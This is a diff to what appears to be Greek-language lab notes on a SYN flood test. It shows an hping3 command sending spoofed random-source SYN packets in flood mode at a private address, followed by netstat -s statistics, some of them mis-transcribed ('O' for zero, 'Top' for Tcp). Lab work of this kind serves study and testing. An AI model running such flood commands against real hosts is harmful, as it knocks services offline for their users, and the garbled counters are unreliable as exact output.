@@ -36,3 +36,60 @@
 ```bash
 sudo hping3 -c 14000 -d 120 -S -w 64 -p 3088 --flood --rand-source 192.168.71.95
 ```
+>> HPING 192.168.71.95 (enp1s0 192.168.71.95): S set, 40 headers + 120 data bytes hping in flood mode, no replies will be shown
+
+~~ Εκτέλεση εντολή netstat ~~
+
+``bash
+netstat -s
+Ip:
+    Forwarding: 1
+    6714892 total packets received
+    1 with invalid addresses
+    6275771 forwarded
+    o incoming packets discarded
+    438890 incoming packets delivered
+    13131741 requests sent out
+    17955 outgoing packets dropped
+    120 dropped because of missing route
+Icmp:
+    64 ICMP messages received
+    64 input ICMP message failed
+    ICMP input histogram:
+    destination unreachable: 64
+    4 ICMP messages sent
+    O ICMP messages failed
+    ICMP output histogram:
+    destination unreachable: 4
+IcmpMsg:
+    InType 3: 64
+    Out Type 3: 4
+Top:
+    789 active connection openings
+    112 passive connection openings
+    19 failed connection attempts
+    17 connection resets received
+    5 connections established
+    438546 segments received
+    261770 segments sent out
+    172 segments retransmitted
+    64 bad segments received
+    537 resets sent
+Udp:
+    1785 packets received
+    2 packets to unknown port received
+    O packet receive errors
+    1870 packets sent
+    o receive buffer errors
+    O send buffer errors
+    IgnoredMulti: 316
+UdpLite:
+TcpExt:
+    398 TCP sockets finished time wait in fast timer
+    215 delayed acks sent
+    1 delayed acks further delayed because of locked socket
+    Quick ack mode was activated 34 times
+    317668 packet headers predicted
+    7373 acknowledgments not containing data payload received
+    23406 predicted acknowledgments
+``
